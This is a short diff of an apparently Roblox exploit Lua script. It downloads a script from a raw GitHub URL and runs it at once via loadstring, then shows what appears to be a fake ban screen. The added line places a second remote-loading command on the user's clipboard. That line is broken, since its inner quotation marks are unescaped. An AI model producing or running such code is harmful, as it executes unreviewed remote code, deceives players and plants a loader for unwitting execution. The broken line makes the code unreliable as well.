@@ -1,3 +1,4 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Imalwibest/Imalwibest/main/wynerdV2.lua",true))()
 task.wait()
 game.Players.LocalPlayer.PlayerGui.BanUi.Enabled = true
+setclipboard("loadstring(game:HttpGet("https://raw.githubusercontent.com/CeXxr/ftt/main/ban"))())
